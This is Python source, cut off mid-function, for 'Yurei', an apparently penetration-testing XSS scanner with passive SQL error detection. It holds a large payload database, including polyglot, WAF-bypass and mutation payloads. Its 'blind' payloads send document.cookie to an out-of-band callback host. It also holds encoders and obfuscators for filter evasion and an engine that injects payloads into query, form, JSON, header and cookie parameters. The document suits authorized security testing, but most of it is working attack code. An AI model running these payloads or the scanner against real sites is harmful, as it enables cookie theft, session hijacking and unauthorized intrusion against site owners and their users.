#!/usr/bin/env python3
"""
Yurei 👻 - Illuminating the Invisible Corners of the Web with XSS. (Passive SQL Error Detection)
Creator: Lunar Lumos 🌙
Legal: authorized testing only, use --confirm-scope.
"""
import asyncio
import argparse
import base64
import json
import random
import re
import string
import sys
import time
import urllib.parse
import html  # <-- ADDED FOR SAFE HTML ESCAPING
from typing import Dict, List, Optional, Set, Tuple, Any, Union
from dataclasses import dataclass, asdict
import hashlib
import os
import signal
import traceback

# Try to import optional dependencies, but don't fail if not available
try:
    import httpx
except ImportError:
    print("[!] httpx not installed. Install with: pip install httpx")
    sys.exit(1)

# Optional: rich for colored output (fallback to plain if not available)
try:
    from rich.console import Console
    from rich.table import Table
    from rich.text import Text
    from rich.panel import Panel
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

# Global console for output
if RICH_AVAILABLE:
    console = Console()
else:
    class DummyConsole:
        def print(self, *args, **kwargs):
            print(*args)
        def log(self, *args, **kwargs):
            print(*args)
    console = DummyConsole()

# Constants
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
]

# XSS Payloads Database — ENHANCED WITH HIGH-SIGNAL PAYLOADS
BUILT_IN_PAYLOADS = {
    "classic": [
        "<script>alert('Yurei')</script>",
        "'\"><script>alert('Yurei')</script>",
        "\"><img src=x onerror=alert('Yurei')>",
        "<svg onload=alert('Yurei')>",
        "<body onload=alert('Yurei')>",
        "<iframe src=\"javascript:alert('Yurei')\">",
        "<script>confirm('Yurei')</script>",
        "<script>prompt('Yurei')</script>",
    ],
    "attribute": [
        "\" onmouseover=\"alert('Yurei')\"",
        "' onfocus='alert('Yurei')' autofocus='",
        "\" onmouseenter=\"alert('Yurei')\"",
        "\" style=\"background:url('javascript:alert('Yurei')')\"",
        "\" x=\"y\" onfocus=\"alert('Yurei')\" autofocus=\"",
        "\" onblur=\"alert('Yurei')\" autofocus=\"\" tabindex=\"1\"",
    ],
    "polyglot": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('Yurei') )//%0D%0A%0d%0a//</stYle/</titLe/</textArea/</script/--!>\\x3csVg/<sVg/oNloAd=alert('Yurei')//>\\x3e",
        "\";alert('Yurei');//",
        "'>\"><img src=x onerror=alert('Yurei')>",
        "</script><script>alert('Yurei')</script>",
        "\"-prompt('Yurei')-\"",
        "';alert('Yurei')//",
        "';alert('Yurei')/*",
        "';alert('Yurei')'",
        "javascript:eval('ale'+'rt(\"Yurei\")')",
        "javascript://%0Aalert('Yurei')",
        "jav&#x61;script:alert('Yurei')",
    ],
    "json": [
        "\"},{'x':'<script>alert('Yurei')</script>'}",
        "\"},{'x':eval('alert(\"Yurei\")')}",
        "\"},{'x':`<img src=x onerror=alert('Yurei')>`}",
        "\"},{'x':'\\\";alert('Yurei');//'}",
        "\"},{'x':'</script><script>alert('Yurei')</script>'}",
        "\"},{'x':'<img src=1 onerror=alert('Yurei')>'}",
    ],
    "event_handler": [
        "onerror=alert('Yurei')",
        "onload=alert('Yurei')",
        "onmouseover=alert('Yurei')",
        "onfocus=alert('Yurei') autofocus",
        "onclick=alert('Yurei')",
        "onmouseenter=alert('Yurei')",
        "onmouseleave=alert('Yurei')",
        "onmousemove=alert('Yurei')",
    ],
    "blind": [
        "<script>fetch('{OOB_CALLBACK}?leak='+document.cookie)</script>",
        "<img src=x onerror=\"fetch('{OOB_CALLBACK}?leak='+btoa(document.cookie))\">",
        "<script>new Image().src='{OOB_CALLBACK}?leak='+encodeURIComponent(document.domain)</script>",
        "<svg onload=\"fetch('{OOB_CALLBACK}?leak='+location.href)\">",
        "<script>fetch('{OOB_CALLBACK}', {method: 'POST', body: document.cookie})</script>",
    ],
    "mutation": [
        "<scr<script>ipt>alert('Yurei')</script>",
        "<im<img>g src=x onerror=alert('Yurei')>",
        "<svg><script>alert('Yurei')</script></svg>",
        "<div style=\"color: expression(alert('Yurei'))\">",
        "<x '=\"foo\"><x foo='><img src=x onerror=alert('Yurei')//>",
        "<<script>alert('Yurei')</script>",
        "<script<alert('Yurei')</script>",
        "<svg</svg><script>alert('Yurei')</script>",
    ],
    "waf_bypass": [
        "<sCrIpT>alert('Yurei')</sCrIpT>",
        "<SCRIPT\x00>alert('Yurei')</SCRIPT>",
        "%3Cscript%3Ealert('Yurei')%3C/script%3E",
        "&#x3C;script&#x3E;alert('Yurei')&#x3C;/script&#x3E;",
        "<img src=\"jav&#x61;script:alert('Yurei')\"/>",
        "<svg><style>{font-family:\"<iframe/onload=alert('Yurei')>\"}</style></svg>",
        "<a/href=javascript&colon;alert('Yurei')>click",
        "<svg/onload=alert('Yurei')>",
        "<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;('Yurei')>",
        "<img src=1 href=1 onerror=\"&#x61;&#x6C;&#x65;&#x72;&#x74;('Yurei')\">",
    ],
    "testbed": [
        "<script>alert('Yurei')</script>",
        "<ScRiPt>alert('Yurei')</ScRiPt>",
        "%3cscript%3ealert('Yurei')%3c%2fscript%3e",
        "\\u003cscript\\u003ealert('Yurei')\\u003c/script\\u003e",
        "<img src=x onerror=alert('Yurei')>",
        "<svg onload=alert('Yurei')>",
        "';alert('Yurei')//",
        "\";alert('Yurei')//",
        "';alert(String.fromCharCode(88,83,83))//",
    ],
    "advanced": [
        "<svg/onload=alert('Yurei')>",
        "<sCrIpT>/*foo*/alert('Yurei')</sCrIpT>",
        "<iframe src='javascript:alert(`Yurei`)'>",
        "<math><mtext><script>alert('Yurei')</script></mtext></math>",
        "\"><script>alert('Yurei')</script>",
        "<body onload=eval('ale'+'rt(\"Yurei\")')>",
        "<div style=\"width: expression(alert('Yurei'))\">",
        "<svg><desc><![CDATA[<script>alert('Yurei')</script>]]></desc></svg>",
        "<img src=x onerror=/*comment*/alert('Yurei')>",
        "<input autofocus onfocus=alert('Yurei')>",
        "<object data='javascript:alert(\"Yurei\")'></object>",
        "<marquee/onstart=alert('Yurei')>",
        "<embed srcdoc=\"<script>alert('Yurei')</script>\"></embed>",
        "<iframe srcdoc=\"<script>alert('Yurei')</script>\"></iframe>",
        "<body onload=eval(String.fromCharCode(97,108,101,114,116,40,39,89,117,114,101,105,39,41))>",
        "<svg><script>alert(`Yurei`)</script></svg>"
    ]
}

# SQL Error Signatures — PASSIVE DETECTION ONLY
SQL_ERROR_SIGNATURES = [
    # MySQL
    r"SQL syntax.*?MySQL",
    r"MySQLSyntaxErrorException",
    r"MySQL.*?near.*?line",
    r"valid MySQL result",
    r"MySqlClient",
    r"MySQL server version",
    r"SQL syntax.*?MariaDB server",
    # PostgreSQL
    r"PostgreSQL.*?ERROR",
    r"PG::SyntaxError:",
    r"valid PostgreSQL result",
    r"PostgreSQL query failed",
    r"pg_query\(",
    r"pg_exec\(",
    # Microsoft SQL Server
    r"Driver.*? SQL[\-\_\ ]*Server",
    r"OLE DB.*? SQL Server",
    r"SQL Server[^<&quot;]+Driver",
    r"Warning.*?mssql_",
    r"Incorrect syntax near",
    r"Unclosed quotation mark after the character string",
    r"Microsoft SQL Native Client error",
    # Oracle
    r"ORA-[0-9]{5}",
    r"Oracle error",
    r"Oracle.*?Driver",
    r"quoted string not properly terminated",
    r"SQL command not properly ended",
    # SQLite
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    # Generic / ORM
    r"SQL (syntax|command) error",
    r"SQLSTATE",
    r"Unknown column",
    r"where clause",
    r"Column count doesn't match",
    r"Table '[^']+' doesn't exist",
    r"Column '[^']+' not found",
    r"Query failed",
    r"Database error",
    r"DB2 SQL error",
    r"Syntax error",
    r"Fatal error.*?SQL",
    r"Warning.*?mysqli?_",
    r"Call to a member function.*? on null.*?SQL",
    r"You have an error in your SQL syntax",
    r"SQLServer.*?Exception",
    r"JDBC.*?SQLException",
]

@dataclass
class Finding:
    """Data structure for findings (XSS and passive SQLi)"""
    url: str
    parameter: str
    payload: str
    injection_type: str
    context: str
    confidence: int
    evidence: str
    poc: str
    response_code: int
    reflection_position: str

    def to_dict(self):
        return asdict(self)

class PayloadEngine:
    """Generates, encodes, and mutates XSS payloads"""
    def __init__(self, custom_payload_file: Optional[str] = None, oob_callback: Optional[str] = None):
        self.payloads = self._load_payloads(custom_payload_file)
        self.oob_callback = oob_callback
        self.payload_stats = {}
        self.encoders = {
            'url': self._url_encode,
            'double_url': self._double_url_encode,
            'html_entity': self._html_entity_encode,
            'unicode': self._unicode_encode,
            'base64': self._base64_encode,
        }
        self.obfuscators = {
            'random_case': self._random_case,
            'tag_split': self._tag_split,
            'comment_insert': self._comment_insert,
            'whitespace_obfuscation': self._whitespace_obfuscation,
        }

    def _load_payloads(self, custom_file: Optional[str]) -> Dict[str, List[str]]:
        """Load built-in payloads and custom payloads if provided"""
        payloads = BUILT_IN_PAYLOADS.copy()
        if custom_file and os.path.exists(custom_file):
            try:
                with open(custom_file, 'r') as f:
                    custom_payloads = [line.strip() for line in f if line.strip()]
                    if 'custom' not in payloads:
                        payloads['custom'] = []
                    payloads['custom'].extend(custom_payloads)
            except Exception as e:
                console.log(f"[!] Error loading custom payloads: {e}")
        return payloads

    def get_all_payloads(self) -> List[str]:
        """Flatten all payloads into a single list"""
        all_payloads = []
        for category, payload_list in self.payloads.items():
            for payload in payload_list:
                if self.oob_callback and '{OOB_CALLBACK}' in payload:
                    payload = payload.replace('{OOB_CALLBACK}', self.oob_callback)
                all_payloads.append(payload)
        return all_payloads

    def generate_variants(self, payload: str, max_variants: int = 5) -> List[str]:
        """Generate mutated variants of a payload for bypass attempts"""
        variants = [payload]
        # Apply different encodings
        for encoder_name, encoder_func in self.encoders.items():
            if len(variants) >= max_variants:
                break
            try:
                encoded = encoder_func(payload)
                if encoded != payload and encoded not in variants:
                    variants.append(encoded)
            except:
                continue
        # Apply obfuscations
        for obfuscator_name, obfuscator_func in self.obfuscators.items():
            if len(variants) >= max_variants:
                break
            try:
                obfuscated = obfuscator_func(payload)
                if obfuscated != payload and obfuscated not in variants:
                    variants.append(obfuscated)
            except:
                continue
        return variants[:max_variants]

    # Encoding methods
    def _url_encode(self, s: str) -> str:
        return urllib.parse.quote(s)

    def _double_url_encode(self, s: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(s))

    def _html_entity_encode(self, s: str) -> str:
        html_entities = {
            '<': '<',
            '>': '>',
            '"': '&quot;',
            "'": '&#x27;',
            '&': '&amp;',
            '/': '&#x2F;',
        }
        for char, entity in html_entities.items():
            s = s.replace(char, entity)
        return s

    def _unicode_encode(self, s: str) -> str:
        return ''.join(f"\\u{ord(c):04x}" if ord(c) > 127 else c for c in s)

    def _base64_encode(self, s: str) -> str:
        return base64.b64encode(s.encode()).decode()

    # Obfuscation methods
    def _random_case(self, s: str) -> str:
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    def _tag_split(self, s: str) -> str:
        # Split tags like <script> into <sc<script>ript> (partial)
        if '<' in s and '>' in s:
            parts = s.split('<')
            result = parts[0]
            for part in parts[1:]:
                if '>' in part:
                    tag_content, rest = part.split('>', 1)
                    if len(tag_content) > 3:
                        split_point = random.randint(2, len(tag_content)-1)
                        result += f"<{tag_content[:split_point]}<{tag_content[split_point:]}>>{rest}"
                    else:
                        result += f"<{part}"
                else:
                    result += f"<{part}"
            return result
        return s

    def _comment_insert(self, s: str) -> str:
        # Insert HTML comments in tags
        if '<' in s and '>' in s:
            return re.sub(r'(<[^>]*>)', lambda m: m.group(0).replace('>', '><!-- comment -->'), s)
        return s

    def _whitespace_obfuscation(self, s: str) -> str:
        # Add random whitespace around operators
        return re.sub(r'([=();])', lambda m: m.group(0) + random.choice([' ', '\t', '\n', '\r']), s)

class ParameterDiscovery:
    """Discovers parameters in URLs, forms, and JSON bodies"""
    def __init__(self, include_hidden: bool = False):
        self.include_hidden = include_hidden

    async def discover_parameters(self, url: str, client: httpx.AsyncClient) -> Dict[str, Any]:
        """Discover all injectable parameters for a given URL"""
        params = {
            'query': set(),
            'form': {},
            'json': set(),
            'headers': set(),
            'cookies': set()
        }
        try:
            # Get the page first
            response = await client.get(url)
            # Extract query parameters from URL
            parsed_url = urllib.parse.urlparse(url)
            if parsed_url.query:
                query_params = urllib.parse.parse_qs(parsed_url.query)
                params['query'].update(query_params.keys())
            # Extract form parameters from HTML
            if 'text/html' in response.headers.get('content-type', '').lower():
                form_params = self._extract_form_params(response.text)
                params['form'].update(form_params)
            # Check for JSON endpoints by sending a test JSON payload
            if self._might_be_json_endpoint(url):
                # Try to get JSON structure
                json_params = await self._discover_json_params(url, client)
                params['json'].update(json_params)
            # Common headers to test
            params['headers'].update([
                'User-Agent', 'Referer', 'X-Forwarded-For', 
                'Origin', 'Accept', 'Cookie'
            ])
            # Extract cookies
            if response.cookies:
                params['cookies'].update(response.cookies.keys())
        except Exception as e:
            console.log(f"[!] Error discovering parameters for {url}: {e}")
        return params

    def _extract_form_params(self, html: str) -> Dict[str, List[str]]:
        """Extract form parameters from HTML"""
        form_params = {}
        # Find all form elements
        form_pattern = r'<form[^>]*>(.*?)</form>'
        forms = re.findall(form_pattern, html, re.DOTALL | re.IGNORECASE)
        for form in forms:
            # Extract input fields
            input_pattern = r'<input[^>]*name\s*=\s*["\']([^"\']*)["\'][^>]*>'
            inputs = re.findall(input_pattern, form, re.IGNORECASE)
            # Extract textarea fields
            textarea_pattern = r'<textarea[^>]*name\s*=\s*["\']([^"\']*)["\'][^>]*>'
            textareas = re.findall(textarea_pattern, form, re.IGNORECASE)
            # Extract select fields
            select_pattern = r'<select[^>]*name\s*=\s*["\']([^"\']*)["\'][^>]*>'
            selects = re.findall(select_pattern, form, re.IGNORECASE)
            # Combine all form fields
            all_fields = inputs + textareas + selects
            # If including hidden parameters, also extract hidden fields
            if self.include_hidden:
                hidden_pattern = r'<input[^>]*type\s*=\s*["\']hidden["\'][^>]*name\s*=\s*["\']([^"\']*)["\'][^>]*>'
                hidden_fields = re.findall(hidden_pattern, form, re.IGNORECASE)
                all_fields.extend(hidden_fields)
            # Create parameter structure
            for field in all_fields:
                if field not in form_params:
                    form_params[field] = []
        return form_params

    def _might_be_json_endpoint(self, url: str) -> bool:
        """Heuristic to determine if URL might be a JSON endpoint"""
        json_indicators = ['.json', '/api/', '/rest/', '/graphql', '/v1/', '/v2/']
        return any(indicator in url.lower() for indicator in json_indicators)

    async def _discover_json_params(self, url: str, client: httpx.AsyncClient) -> Set[str]:
        """Attempt to discover JSON parameters by sending malformed JSON"""
        json_params = set()
        # Common JSON parameter names
        common_params = {'id', 'name', 'email', 'username', 'password', 'data', 'query', 'filter'}
        # Try sending empty JSON object
        try:
            response = await client.post(
                url, 
                json={}, 
                headers={'Content-Type': 'application/json'}
            )
            # If server responds with validation errors, extract parameter names
            if response.status_code == 400 and 'json' in response.headers.get('content-type', '').lower():
                error_text = response.text.lower()
                for param in common_params:
                    if param in error_text:
                        json_params.add(param)
        except:
            pass
        # If no parameters found, return common ones as candidates
        if not json_params:
            json_params = common_params.copy()
        return json_params

class Scanner:
    """Main scanning engine for XSS detection — with PASSIVE SQL ERROR DETECTION"""
    def __init__(
        self, 
        payload_engine: PayloadEngine, 
        threads: int = 20, 
        timeout: int = 10, 
        proxy: Optional[str] = None,
        headers: Optional[Dict[str, str]] = None,
        rate_limit: Optional[int] = None,
        verbose: bool = False
    ):
        self.payload_engine = payload_engine
        self.threads = threads
        self.timeout = timeout
        self.proxy = proxy
        self.custom_headers = headers or {}
        self.rate_limit = rate_limit
        self.verbose = verbose
        self.findings = []
        self.scanned_count = 0
        self.start_time = None
        self.include_hidden = False  # Will be set externally
        self.reported_sql_errors = set()  # Avoid duplicate SQL error reports
        # Rate limiting
        self.request_count = 0
        self.rate_limit_start = time.time()
        # Semaphore for concurrency control
        self.semaphore = asyncio.Semaphore(threads)

    async def scan_url(self, url: str) -> List[Finding]:
        """Scan a single URL for XSS vulnerabilities — MAIN ENTRY POINT"""
        self.findings = []
        self.start_time = time.time()
        # Create HTTP client
        client = self._create_client()
        try:
            # Discover parameters
            if self.verbose:
                console.log(f"[+] Discovering parameters for {url}")
            param_discovery = ParameterDiscovery(include_hidden=self.include_hidden)
            parameters = await param_discovery.discover_parameters(url, client)
            if self.verbose:
                total_params = sum([
                    len(parameters['query']), 
                    len(parameters['form']), 
                    len(parameters['json']), 
                    len(parameters['headers']), 
                    len(parameters['cookies'])
                ])
                console.log(f"[+] Discovered {total_params} parameters to test")
            # Create scan tasks
            tasks = []
            # Test query parameters
            for param in parameters['query']:
                tasks.extend(self._create_query_scan_tasks(url, param, client))
            # Test form parameters
            for param in parameters['form']:
                tasks.extend(self._create_form_scan_tasks(url, param, client))
            # Test JSON parameters
            for param in parameters['json']:
                tasks.extend(self._create_json_scan_tasks(url, param, client))
            # Test header parameters
            for param in parameters['headers']:
                tasks.extend(self._create_header_scan_tasks(url, param, client))
            # Test cookie parameters
            for param in parameters['cookies']:
                tasks.extend(self._create_cookie_scan_tasks(url, param, client))
            if self.verbose:
                console.log(f"[+] Created {len(tasks)} scan tasks")
            # Execute tasks with rate limiting
            if self.rate_limit:
                await self._execute_tasks_with_rate_limit(tasks)
            else:
                await asyncio.gather(*tasks, return_exceptions=True)
        except Exception as e:
            console.log(f"[!] Error scanning {url}: {e}")
            if self.verbose:
                console.log(traceback.format_exc())
        finally:
            await client.aclose()
        return self.findings

    def _create_client(self) -> httpx.AsyncClient:
        """Create HTTP client with configured settings"""
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
        }
        headers.update(self.custom_headers)
        client_args = {
            'headers': headers,
            'timeout': self.timeout,
            'follow_redirects': True,
        }
        if self.proxy:
            client_args['proxies'] = self.proxy
        return httpx.AsyncClient(**client_args)

    def _create_query_scan_tasks(self, url: str, param: str, client: httpx.AsyncClient) -> List[asyncio.Task]:
        """Create scan tasks for query parameters"""
        tasks = []
        payloads = self.payload_engine.get_all_payloads()
        for payload in payloads:
            # Create URL with injected parameter
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)
            # Store original value
            original_value = query_params.get(param, [''])[0] if param in query_params else ''
            # Inject payload
            query_params[param] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            new_url = parsed._replace(query=new_query).geturl()
            task = asyncio.create_task(
                self._scan_task(
                    client, 
                    new_url, 
                    'query', 
                    param, 
                    payload, 
                    original_value,
                    'GET'
                )
            )
            tasks.append(task)
            # Also test with POST if the endpoint accepts it
            if self._might_accept_post(url):
                task = asyncio.create_task(
                    self._scan_task(
                        client, 
                        url, 
                        'query', 
                        param, 
                        payload, 
                        original_value,
                        'POST',
                        data={param: payload}
                    )
                )
                tasks.append(task)
        return tasks

    def _create_form_scan_tasks(self, url: str, param: str, client: httpx.AsyncClient) -> List[asyncio.Task]:
        """Create scan tasks for form parameters"""
        tasks = []
        payloads = self.payload_engine.get_all_payloads()
        for payload in payloads:
            # Test with POST
            task = asyncio.create_task(
                self._scan_task(
                    client,
                    url,
                    'form',
                    param,
                    payload,
                    '',
                    'POST',
                    data={param: payload}
                )
            )
            tasks.append(task)
            # Test with GET (query string)
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query) if parsed.query else {}
            query_params[param] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            new_url = parsed._replace(query=new_query).geturl()
            task = asyncio.create_task(
                self._scan_task(
                    client,
                    new_url,
                    'form',
                    param,
                    payload,
                    '',
                    'GET'
                )
            )
            tasks.append(task)
        return tasks

    def _create_json_scan_tasks(self, url: str, param: str, client: httpx.AsyncClient) -> List[asyncio.Task]:
        """Create scan tasks for JSON parameters"""
        tasks = []
        payloads = self.payload_engine.get_all_payloads()
        for payload in payloads:
            # Create JSON body with payload
            json_data = {param: payload}
            task = asyncio.create_task(
                self._scan_task(
                    client,
                    url,
                    'json',
                    param,
                    payload,
                    '',
                    'POST',
                    json=json_data,
                    headers={'Content-Type': 'application/json'}
                )
            )
            tasks.append(task)
        return tasks

    def _create_header_scan_tasks(self, url: str, param: str, client: httpx.AsyncClient) -> List[asyncio.Task]:
        """Create scan tasks for header parameters"""
        tasks = []
        payloads = self.payload_engine.get_all_payloads()
        for payload in payloads:
            headers = {param: payload}
            headers.update(self.custom_headers)
            task = asyncio.create_task(
                self._scan_task(
                    client,
                    url,
                    'header',
                    param,
                    payload,
                    '',
                    'GET',
                    headers=headers
                )
            )
            tasks.append(task)
        return tasks

    def _create_cookie_scan_tasks(self, url: str, param: str, client: httpx.AsyncClient) -> List[asyncio.Task]:
        """Create scan tasks for cookie parameters"""
        tasks = []
        payloads = self.payload_engine.get_all_payloads()
        for payload in payloads:
            cookies = {param: payload}
            task = asyncio.create_task(
                self._scan_task(
                    client,
                    url,
                    'cookie',
                    param,
                    payload,
                    '',
                    'GET',
                    cookies=cookies
                )
            )
            tasks.append(task)
        return tasks

    async def _get_baseline(self, client: httpx.AsyncClient, url: str, method: str, data, json_data, headers, cookies) -> httpx.Response:
        """Get baseline response for comparison"""
        request_kwargs = {
            'url': url,
            'timeout': self.timeout,
            'follow_redirects': True
        }
        if headers:
            clean_headers = {k: v for k, v in headers.items() if k not in ['User-Agent', 'Referer', 'X-Forwarded-For', 'Origin']}
            if clean_headers:
                request_kwargs['headers'] = clean_headers
        if cookies:
            request_kwargs['cookies'] = cookies
        if method.upper() == 'POST':
            if json_data is not None:
                baseline_json = {}
                for key in json_data.keys():
                    baseline_json[key] = "yurei_baseline_test"
                request_kwargs['json'] = baseline_json
            elif data is not None:
                baseline_data = {}
                for key in data.keys():
                    baseline_data[key] = "yurei_baseline_test"
                request_kwargs['data'] = baseline_data
        try:
            response = await getattr(client, method.lower())(**request_kwargs)
            return response
        except Exception as e:
            if self.verbose:
                console.log(f"[!] Baseline request failed: {e}")
            # Return a dummy response
            class DummyResponse:
                def __init__(self):
                    self.text = ""
                    self.content = b""
                    self.status_code = 0
                    self.headers = {}
            return DummyResponse()

    async def _scan_task(
        self, 
        client: httpx.AsyncClient, 
        url: str, 
        param_type: str, 
        param_name: str, 
        payload: str, 
        original_value: str,
        method: str = 'GET',
        data: Optional[Dict] = None,
        json: Optional[Dict] = None,
        headers: Optional[Dict] = None,
        cookies: Optional[Dict] = None
    ):
        """Execute a single scan task with rate limiting and error handling"""
        async with self.semaphore:
            # Apply rate limiting
            if self.rate_limit:
                await self._apply_rate_limit()
            try:
                # Get baseline response
                baseline_response = await self._get_baseline(client, url, method, data, json, headers, cookies)
                # Prepare request
                request_kwargs = {
                    'url': url,
                    'timeout': self.timeout,
                    'follow_redirects': True
                }
                if headers:
                    request_kwargs['headers'] = headers
                if cookies:
                    request_kwargs['cookies'] = cookies
                if method.upper() == 'POST':
                    if json is not None:
                        request_kwargs['json'] = json
                    elif data is not None:
                        request_kwargs['data'] = data
                if self.verbose:
                    console.log(f"[+] Testing {param_name} with payload: {payload[:50]}...")
                start_time = time.time()
                response = await getattr(client, method.lower())(**request_kwargs)
                response_time = time.time() - start_time
                # ➤➤➤ PASSIVE SQL ERROR DETECTION — Check baseline and current response
                await self._detect_sql_errors(baseline_response, url, "BASELINE", method, param_name)
                await self._detect_sql_errors(response, url, param_name, method, payload)
                # Analyze response — ENHANCED XSS DETECTION
                finding = await self._analyze_response_enhanced(
                    response, 
                    baseline_response, 
                    url, 
                    param_name, 
                    payload, 
                    param_type,
                    response_time
                )
                if finding:
                    # Avoid duplicates
                    is_duplicate = any(
                        f.url == finding.url and 
                        f.parameter == finding.parameter and 
                        f.payload == finding.payload 
                        for f in self.findings
                    )
                    if not is_duplicate:
                        self.findings.append(finding)
                        self._print_finding(finding)
                        # If finding is low confidence but contains dangerous pattern, try variants
                        if finding.confidence < 70:
                            variants = self.payload_engine.generate_variants(payload, max_variants=3)
                            for variant in variants:
                                # Create variant request
                                variant_kwargs = request_kwargs.copy()
                                if json is not None:
                                    variant_json = json.copy()
                                    for key in variant_json:
                                        if variant_json[key] == payload:
                                            variant_json[key] = variant
                                    variant_kwargs['json'] = variant_json
                                elif data is not None:
                                    variant_data = data.copy()
                                    for key in variant_data:
                                        if variant_data[key] == payload:
                                            variant_data[key] = variant
                                    variant_kwargs['data'] = variant_data
                                elif param_type == 'query':
                                    parsed = urllib.parse.urlparse(url)
                                    query_params = urllib.parse.parse_qs(parsed.query)
                                    if param_name in query_params:
                                        query_params[param_name] = [variant]
                                        new_query = urllib.parse.urlencode(query_params, doseq=True)
                                        variant_kwargs['url'] = parsed._replace(query=new_query).geturl()
                                try:
                                    variant_response = await getattr(client, method.lower())(**variant_kwargs)
                                    # Also check for SQL errors in variant response
                                    await self._detect_sql_errors(variant_response, url, param_name, method, variant)
                                    variant_finding = await self._analyze_response_enhanced(
                                        variant_response,
                                        baseline_response,
                                        url,
                                        param_name,
                                        variant,
                                        param_type,
                                        time.time() - start_time
                                    )
                                    if variant_finding and not any(
                                        f.url == variant_finding.url and 
                                        f.parameter == variant_finding.parameter and 
                                        f.payload == variant_finding.payload 
                                        for f in self.findings
                                    ):
                                        self.findings.append(variant_finding)
                                        self._print_finding(variant_finding)
                                except Exception as e:
                                    if self.verbose:
                                        console.log(f"[!] Error testing variant: {e}")
                                    continue
                self.scanned_count += 1
                if self.verbose and self.scanned_count % 10 == 0:
                    elapsed = time.time() - self.start_time
                    console.log(f"[+] Progress: {self.scanned_count} requests in {elapsed:.1f}s")
            except Exception as e:
                if self.verbose:
                    console.log(f"[!] Request error: {e}")
                    console.log(traceback.format_exc())
                return

    async def _detect_sql_errors(self, response: httpx.Response, url: str, param_name: str, method: str = "GET", payload: str = ""):
        """Passively detect SQL errors in responses — NO INJECTION, JUST DETECTION"""
        if not hasattr(response, 'text') or not response.text:
            return
        response_text = response.text.lower()
        matched_signatures = []
        for signature in SQL_ERROR_SIGNATURES:
            if re.search(signature, response_text, re.IGNORECASE | re.DOTALL):
                matched_signatures.append(signature)
        if not matched_signatures:
            return
        # Create unique key to avoid duplicate reports
        error_key = f"{url}|{param_name}|{method}|{hash(tuple(matched_signatures))}"
        if error_key in self.reported_sql_errors:
            return
        self.reported_sql_errors.add(error_key)
        # Extract evidence snippet
        evidence = "SQL Error Signatures Detected: " + "; ".join(matched_signatures[:3])
        full_evidence = response.text[:1000]  # First 1000 chars for context
        # Create PoC
        poc = f"Visit: {url}\nMethod: {method}\nParameter: {param_name}\nTrigger: {payload[:50]}"
        # Confidence based on response code and signature strength
        confidence = 95  # SQL errors are high-confidence indicators
        if response.status_code in [500, 503]:
            confidence += 5
        if len(matched_signatures) > 1:
            confidence = min(100, confidence + 5)
        finding = Finding(
            url=url,
            parameter=param_name,
            payload=payload,
            injection_type="sqli-error-leak",
            context="passive-detection",
            confidence=confidence,
            evidence=full_evidence,
            poc=poc,
            response_code=response.status_code,
            reflection_position="error-body"
        )
        self.findings.append(finding)
        self._print_finding(finding)

    async def _analyze_response_enhanced(
        self, 
        response: httpx.Response, 
        baseline: httpx.Response, 
        url: str, 
        parameter: str, 
        payload: str, 
        param_type: str,
        response_time: float
    ) -> Optional[Finding]:
        """ENHANCED: Analyze response for XSS vulnerabilities with better detection logic"""
        if not hasattr(response, 'text'):
            return None
        response_text = response.text
        baseline_text = baseline.text if hasattr(baseline, 'text') else ""
        # Skip if server error
        if response.status_code >= 500:
            return None
        # Normalize for comparison
        normalized_payload = payload.strip()
        normalized_response = response_text.strip()
        # CHECK 1: Direct reflection (exact match)
        reflection_found = False
        reflection_variants = [
            normalized_payload,
            self._html_decode(normalized_payload),
            urllib.parse.unquote(normalized_payload),
            urllib.parse.unquote(urllib.parse.unquote(normalized_payload)),
            normalized_payload.replace(" ", "+"),  # URL encoding space variant
        ]
        matched_variant = None
        for variant in reflection_variants:
            if variant in normalized_response:
                reflection_found = True
                matched_variant = variant
                break
        # CHECK 2: High-signal dangerous pattern detection (even if not exact reflection)
        dangerous_pattern_found = False
        dangerous_patterns = [
            (r'<script[^>]*>.*alert\([^)]*\).*?</script>', 95, 'script_context'),
            (r'<script[^>]*>.*confirm\([^)]*\).*?</script>', 90, 'script_context'),
            (r'<script[^>]*>.*prompt\([^)]*\).*?</script>', 90, 'script_context'),
            (r'on\w+\s*=\s*["\'][^"\']*alert\([^)]*\)', 85, 'html_attribute'),
            (r'<img[^>]*\s+onerror\s*=\s*["\'][^"\']*alert\([^)]*\)', 85, 'html_tag'),
            (r'<svg[^>]*\s+onload\s*=\s*["\'][^"\']*alert\([^)]*\)', 85, 'svg_context'),
            (r'javascript\s*:\s*alert\([^)]*\)', 80, 'url_attribute'),
            (r'<body[^>]*\s+onload\s*=\s*["\'][^"\']*alert\([^)]*\)', 85, 'html_body'),
        ]
        detected_pattern = None
        pattern_confidence = 0
        pattern_context = "html_body"
        for pattern, conf, ctx in dangerous_patterns:
            if re.search(pattern, normalized_response, re.IGNORECASE | re.DOTALL):
                dangerous_pattern_found = True
                detected_pattern = pattern
                pattern_confidence = conf
                pattern_context = ctx
                break
        # If neither reflection nor dangerous pattern found, return None
        if not reflection_found and not dangerous_pattern_found:
            return None
        # Determine context
        context = self._determine_context(response_text, payload)
        if dangerous_pattern_found:
            context = pattern_context
        # Calculate confidence — ENHANCED LOGIC
        confidence = 0
        # Base confidence for reflection
        if reflection_found:
            confidence += 30
